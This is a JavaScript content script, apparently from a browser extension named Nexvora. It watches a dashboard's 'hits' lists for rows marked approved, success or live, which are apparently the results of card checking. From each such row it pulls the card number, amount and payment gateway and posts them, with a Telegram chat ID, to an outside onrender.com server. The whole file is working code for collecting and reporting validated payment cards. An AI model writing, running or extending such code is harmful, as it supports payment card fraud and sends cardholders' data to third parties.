/**
 * Nexvora Notification System
 * Monitors the dashboard for successful hits and notifies the Telegram group.
 */

(function() {
    const RENDER_URL = 'https://extensionshitteer.onrender.com';
    let userChatId = 'Unknown';

    // Get User Chat ID from storage
    chrome.storage.local.get(['chatId'], (result) => {
        if (result.chatId) {
            userChatId = result.chatId;
        }
    });

    const notifyServer = async (hitData) => {
        try {
            const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    card: hitData.card,
                    amount: hitData.amount,
                    gateway: hitData.gateway,
                    status: hitData.status,
                    user_chat_id: userChatId
                })
            });
            const data = await response.json();
            console.log('Notification Status:', data);
        } catch (error) {
            console.error('Failed to send notification:', error);
        }
    };

    const processNewRow = (row) => {
        // Obfuscated rows might have dynamic classes, so we look for text patterns
        const text = row.innerText || '';
        const lowerText = text.toLowerCase();

        // Check if this hit is successful
        if (lowerText.includes('approved') || lowerText.includes('success') || lowerText.includes('live')) {
            console.log('Nexvora: Successful hit detected in UI!', text);
            
            // Extract data (this is generic parsing, might need adjustment based on UI layout)
            const parts = text.split('\n').map(p => p.trim()).filter(p => p);
            
            // Basic extraction logic - update based on row structure
            // Example Row: "415930... | $10 | Stripe | Approved"
            const hitData = {
                card: parts[0] || 'N/A',
                amount: parts[1] || 'N/A',
                gateway: parts[2] || 'Stripe',
                status: parts[3] || 'Approved'
            };

            notifyServer(hitData);
        }
    };

    const setupObserver = () => {
        const containers = [
            document.getElementById('recentHitsWrap'),
            document.getElementById('hitsWrap')
        ];

        containers.forEach(container => {
            if (!container) return;

            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) { // Element node
                            processNewRow(node);
                        }
                    });
                });
            });

            observer.observe(container, { childList: true });
            console.log(`Nexvora: Monitoring ${container.id} for hits...`);
        });
    };

    // Initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupObserver);
    } else {
        setupObserver();
    }
})();
